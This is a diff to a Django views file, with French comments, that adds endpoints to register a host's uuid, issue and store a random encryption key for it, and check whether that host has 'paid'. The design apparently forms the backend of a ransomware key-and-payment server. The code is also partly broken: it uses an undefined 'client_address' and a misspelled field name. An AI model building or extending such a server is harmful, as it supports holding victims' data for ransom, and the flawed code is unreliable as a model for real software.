@@ -3,6 +3,7 @@ from django.shortcuts import render
 from django.utils.crypto import get_random_string
 import pdb;
 import json
+from .models import SimpleDatas
 
 
 # Create your views here.
@@ -19,6 +20,33 @@ class IndexView(generic.ListView):
         #return Question.objects.order_by('-pub_date')[:5]
 
 
+
+def pay(request):
+    ## Faire peter un formulaire et on est good
+    return JsonResponse({})
+
+@csrf_exempt
+def paid(request):
+    datas = {"paid":False}
+    expected_keys = ("uuid", "host")  ##Tuples -> faster && non modifiable
+
+    # Check if request body exists
+    # Check if request body exists
+    if (request.body):
+
+        try:
+            content = json.loads(request.body)
+        except ValueError:  # includes simplejson.decoder.JSONDecodeError
+            return JsonResponse({"error": -1})
+
+        # Check if json params exists
+        # Le condense d'une vingtaine de ligne en une seule
+        if len([val for i, val in enumerate(content) if content[val] and val in expected_keys]) == len(expected_keys):
+            sp = SimpleDatas.objects.get(uuid=content["uuid"],host=content["host"])
+
+            datas["paid"] = sp.paid
+
+    return JsonResponse(datas)
 
 @csrf_exempt
 def register(request):
@@ -42,10 +70,13 @@ def register(request):
         # Le condense d'une vingtaine de ligne en une seule
         if len([val for i, val in enumerate(content) if content[val] and val in expected_keys]) == len(expected_keys):
             #Generate token
-            string = get_random_string(512)
-            data["encryption_key"] = ":".join("{:02x}".format(ord(c)) for c in string)
+            encrypted_string = get_random_string(512)
+            data["encryption_key"] = ":".join("{:02x}".format(ord(c)) for c in encrypted_string)
 
             #Add all in database -
+            sp = SimpleDatas(client_adress=client_address,
+                             uuid=content["uuid"],host=content["host"],encryption_key=encrypted_string)
+            sp.save()
 
         else:
             data["error"] = 2
